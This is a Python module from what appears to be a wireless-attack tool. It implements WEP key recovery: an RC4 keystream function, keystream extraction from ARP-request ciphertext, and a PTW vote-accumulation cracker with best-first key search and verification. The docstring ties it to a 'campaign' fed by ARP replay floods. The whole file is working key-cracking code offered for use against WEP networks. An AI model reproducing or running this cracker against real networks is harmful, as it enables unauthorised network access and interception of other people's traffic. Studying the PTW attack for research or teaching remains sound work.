"""WEP key recovery from collected IVs.

Two implementations behind one ``WepCracker`` protocol:

- ``PlaceholderCracker``: the no-shell-out MVP. It just watches the
  unique-IV count and reports "ready" at the crack threshold; ``recover()``
  always returns None. Not wired into the campaign. ``PtwCracker`` (below) is.
- ``PtwCracker``: a native, self-contained PTW (Pyshkin-Tews-Weinmann 2007)
  key-recovery. No external aircrack. Fed a stream of ``(IV, keystream)``
  samples; the per-IV votes are *additive*, so it ingests incrementally as
  IVs arrive and a cheap search re-runs on demand.

Both are pure Python and need no hardware: correctness is proven offline by
``tests/crack/test_wep_crack.py``, which generates WEP packets under a known
key and asserts recovery.

PTW background (why it works): a WEP per-packet RC4 key is ``IV(3) || root``.
The IV is public, so the first 3 KSA steps are known. Klein's correlation
then lets each packet's early keystream bytes *vote* for the root-key byte
sums; with enough IVs the correct sums win by a wide margin. Because the
first ~16 plaintext bytes of an ARP are fixed (LLC/SNAP + ARP header), ARP
traffic yields the known keystream PTW needs, which is exactly what ARP
replay floods us with.
"""

from __future__ import annotations

from typing import List, Optional, Protocol, Tuple, runtime_checkable

# ---- RC4 --------------------------------------------------------------------


def rc4_keystream(key: bytes, n: int) -> bytes:
    """First ``n`` bytes of the RC4 keystream for ``key``."""
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    out = bytearray(n)
    i = j = 0
    for k in range(n):
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out[k] = S[(S[i] + S[j]) & 0xFF]
    return bytes(out)


# Known first 16 plaintext bytes of a WEP-encrypted ARP REQUEST:
#   AA AA 03 00 00 00   LLC/SNAP
#   08 06               EtherType = ARP
#   00 01               HW type = Ethernet
#   08 00               Proto type = IPv4
#   06 04               HW / proto address sizes
#   00 01               Opcode = request
# (Broadcast ARPs relayed by the AP are requests, so byte 15 = 0x01 holds.)
ARP_REQUEST_PLAINTEXT = bytes(
    [0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06,
     0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x01]
)


def keystream_from_arp_cipher(cipher: bytes) -> bytes:
    """Recover keystream bytes from an ARP-request ciphertext prefix via the
    known plaintext (keystream = cipher XOR plaintext)."""
    n = min(len(cipher), len(ARP_REQUEST_PLAINTEXT))
    return bytes(cipher[i] ^ ARP_REQUEST_PLAINTEXT[i] for i in range(n))


# WEP key lengths to try (root-key bytes, excluding the 3-byte IV): 40-bit and
# 104-bit. 40-bit needs only keystream[0..6]; 104-bit needs [0..14].
WEP_KEYLENS = (5, 13)

# Unique IVs at which recovery is worth attempting. 40-bit falls well under
# this; 104-bit wants ~40-85k, so the cracker keeps trying as more arrive.
CRACK_READY_THRESHOLD = 10_000


# ---- Cracker protocol -------------------------------------------------------


@runtime_checkable
class WepCracker(Protocol):
    """Streaming WEP key recovery. ``feed`` ingests samples incrementally;
    ``recover`` attempts a key from what's been fed so far."""

    def feed(self, iv: bytes, keystream: bytes) -> None: ...
    def recover(self) -> Optional[bytes]: ...
    @property
    def sample_count(self) -> int: ...
    @property
    def ready(self) -> bool: ...


class PlaceholderCracker:
    """No-shell-out MVP: counts samples, reports readiness, recovers nothing.

    The streaming ``feed`` shape matches PtwCracker so swapping the native
    cracker in later is drop-in for the campaign/UI."""

    def __init__(self, threshold: int = CRACK_READY_THRESHOLD):
        self.threshold = threshold
        self._count = 0

    def feed(self, iv: bytes, keystream: bytes) -> None:
        self._count += 1

    def recover(self) -> Optional[bytes]:
        return None

    @property
    def sample_count(self) -> int:
        return self._count

    @property
    def ready(self) -> bool:
        return self._count >= self.threshold


# ---- Native PTW -------------------------------------------------------------


def _ksa_first3(iv: bytes) -> Tuple[List[int], int]:
    """RC4 KSA state after the 3 (public, IV-derived) steps: returns the
    permutation S_3 and the index j_3."""
    S = list(range(256))
    j = 0
    for i in range(3):
        j = (j + S[i] + iv[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
    return S, j


class PtwCracker:
    """Native PTW key recovery.

    For each (IV, keystream) sample we cast one vote per root-key-sum index.
    The sums are IV-independent (the IV contribution is subtracted), so votes
    accumulate across all packets. ``recover`` reads off the winning sums,
    differences them into key bytes, and verifies the candidate by re-deriving
    the keystream, trying both 40- and 104-bit lengths.
    """

    def __init__(
        self,
        keylens: Tuple[int, ...] = WEP_KEYLENS,
        ready_threshold: int = CRACK_READY_THRESHOLD,
    ):
        self.keylens = keylens
        self.ready_threshold = ready_threshold
        self._max_keylen = max(keylens)
        # votes[i][v] = #packets voting that root-sum at index i equals v.
        # i runs over the key-byte indices 3 .. 2+max_keylen.
        self._votes = [[0] * 256 for _ in range(3 + self._max_keylen)]
        self._count = 0
        # A few samples kept for candidate verification.
        self._verify: List[Tuple[bytes, bytes]] = []

    # -- ingest ---------------------------------------------------------------

    def feed(self, iv: bytes, keystream: bytes) -> None:
        if len(iv) < 3 or len(keystream) < 2 + self._max_keylen:
            return
        S, j3 = _ksa_first3(iv)
        Sinv = [0] * 256
        for x in range(256):
            Sinv[S[x]] = x
        cum = j3
        for i in range(3, 3 + self._max_keylen):
            cum = (cum + S[i]) & 0xFF                       # j3 + Σ_{l=3}^{i} S[l]
            ks = keystream[i - 1]                           # i-th keystream byte
            # Klein/PTW (approximating S_i ≈ S_3): this estimates the ROOT-key
            # sum Σ_{l=3}^{i} K[l] directly (IV-independent), so votes from
            # packets with different IVs accumulate. (Subtracting the IV sum,
            # which varies per packet, would scramble the vote.)
            sigma = (Sinv[(i - ks) & 0xFF] - cum) & 0xFF
            self._votes[i][sigma] += 1
        self._count += 1
        if len(self._verify) < 16:
            self._verify.append((bytes(iv), bytes(keystream)))

    # -- recover --------------------------------------------------------------

    # Bounded "fudge" search (aircrack's term): per byte we try its top vote-
    # getters, exploring combinations nearest the most-voted ("argmax") first.
    # The caps bound the work so a doomed attempt (too few IVs to recover yet)
    # returns fast instead of grinding.
    _DEPTH_CAP = 16
    _MAX_TRIALS = 100_000

    def recover(self) -> Optional[bytes]:
        if self._count == 0:
            return None
        for keylen in self.keylens:
            # Per root-sum index, candidate σ values ranked by vote count.
            ranked = [
                sorted(range(256), key=lambda v, i=3 + m: self._votes[i][v], reverse=True)
                for m in range(keylen)
            ]
            key = self._search(ranked, keylen)
            if key is not None:
                return key
        return None

    def _key_from_sigmas(self, sigmas: List[int]) -> bytes:
        """Turn the recovered sums back into key bytes.

        Each sigma is a running total of the key bytes so far (sigma[m] = key
        byte 0 + ... + key byte m). So each key byte is just that running total
        minus the previous one; the running total before the first byte is 0.
        """
        key = bytearray(len(sigmas))
        prev = 0
        for m, s in enumerate(sigmas):
            key[m] = (s - prev) & 0xFF
            prev = s
        return bytes(key)

    def _search(self, ranked: List[List[int]], keylen: int) -> Optional[bytes]:
        """Best-first over per-byte candidate ranks: try the all-argmax key
        first, then keys one rank off on one byte, etc., so a couple of
        not-quite-top byte sums are recovered without blowing up the search."""
        import heapq

        start = (0,) * keylen
        heap = [(0, start)]
        seen = {start}
        trials = 0
        while heap and trials < self._MAX_TRIALS:
            _, ranks = heapq.heappop(heap)
            sigmas = [ranked[m][ranks[m]] for m in range(keylen)]
            trials += 1
            if self._verify_key(self._key_from_sigmas(sigmas)):
                return self._key_from_sigmas(sigmas)
            for m in range(keylen):
                if ranks[m] + 1 < self._DEPTH_CAP:
                    nxt = ranks[:m] + (ranks[m] + 1,) + ranks[m + 1:]
                    if nxt not in seen:
                        seen.add(nxt)
                        heapq.heappush(heap, (sum(nxt), nxt))
        return None

    # Verify against this many held-back samples; accept the key if all but at
    # most this many reproduce, tolerating the rare odd-packet-out (a frame
    # that was ARP-sized + broadcast but not actually an ARP request, so its
    # "known plaintext" was wrong). Without the tolerance one bad sample in the
    # fixed verify set would reject the *correct* key forever.
    _VERIFY_SAMPLES = 8
    _VERIFY_TOLERANCE = 1

    def _verify_key(self, key: bytes) -> bool:
        """Re-derive each held-back sample's keystream with this key and count
        matches; a wrong key matches ~none, the right key matches all (bar an
        odd packet). Drops any confirmed odd-packet-out from the verify set."""
        if not self._verify:
            return False
        checks = self._verify[: self._VERIFY_SAMPLES]
        need = 2 + len(key)
        mismatches = []
        for idx, (iv, ks) in enumerate(checks):
            produced = rc4_keystream(iv + key, need)
            if produced[: len(ks)] != ks[: len(produced)]:
                mismatches.append(idx)
                # Bail the instant a wrong key exceeds tolerance: this keeps
                # the per-candidate cost ~2 RC4 across the brute-force search
                # instead of always paying for all _VERIFY_SAMPLES.
                if len(mismatches) > self._VERIFY_TOLERANCE:
                    return False
        # Correct key (modulo a stray sample): evict the odd ones so they
        # can't poison a future check.
        for idx in reversed(mismatches):
            del self._verify[idx]
        return True

    @property
    def sample_count(self) -> int:
        return self._count

    @property
    def ready(self) -> bool:
        return self._count >= self.ready_threshold
